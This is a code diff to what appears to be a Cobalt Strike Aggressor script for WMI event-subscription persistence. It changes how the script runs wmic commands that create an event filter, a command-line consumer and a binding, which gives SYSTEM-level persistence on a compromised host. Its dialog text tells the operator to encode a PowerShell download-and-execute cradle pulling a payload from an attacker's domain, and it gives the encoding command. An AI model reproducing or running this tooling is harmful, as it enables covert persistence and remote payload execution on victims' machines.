@@ -11,12 +11,12 @@ sub persistwmieventwmic {
 			break;
 		}
 		else {
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
-			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
+			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
 		}
 	}));
 	dialog_description($dialog, "Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** ");
